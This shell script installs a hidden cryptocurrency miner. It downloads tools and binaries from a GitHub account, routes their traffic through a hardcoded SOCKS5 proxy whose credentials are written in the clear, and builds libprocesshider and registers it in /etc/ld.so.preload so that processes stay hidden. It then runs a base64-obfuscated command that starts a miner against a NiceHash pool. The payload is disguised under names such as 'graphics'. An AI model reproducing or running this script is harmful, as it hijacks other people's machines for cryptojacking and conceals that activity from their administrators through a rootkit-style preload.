#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  45.86.71.9:6269
socks5_username = tahugoreng
socks5_password = dadakan123
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
base64 -d <<< Li9ncmFmdGNwL2dyYWZ0Y3AgLi9iZXp6SGFzaCAtLXVybD1zc2w6Ly8zSjdyWWRFOWo1dHZobXMyZW1rTkNMcHZKMmZtVmNIeHJpLkRFTlRAZGFnZ2VyaGFzaGltb3RvLnVzYS13ZXN0Lm5pY2VoYXNoLmNvbTozMzM1MyAtLWxvZyAtLWV4dHJhIC0tbGF0ZW5jeSAtLWFsbC1zaGFyZXMgLS1zaGFyZXMtZGV0YWlsIC0tc2hvdy1tb2RlIC0tbGlzdC1tb2RlcyAtLW1vZGU9OTkK | sh
